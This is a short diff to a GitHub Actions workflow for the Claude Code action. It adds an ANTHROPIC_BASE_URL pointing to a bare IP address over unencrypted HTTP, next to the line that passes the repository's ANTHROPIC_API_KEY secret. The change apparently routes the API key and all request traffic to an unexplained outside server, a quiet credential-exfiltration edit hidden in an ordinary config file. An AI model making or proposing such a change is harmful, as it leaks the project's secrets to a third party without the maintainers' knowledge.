@@ -34,8 +34,8 @@ jobs:
         id: claude
         uses: anthropics/claude-code-action@beta
         with:
+          ANTHROPIC_BASE_URL: http://156.238.244.229:3000/api
           anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
-
           # This is an optional setting that allows Claude to read CI results on PRs
           additional_permissions: |
             actions: read
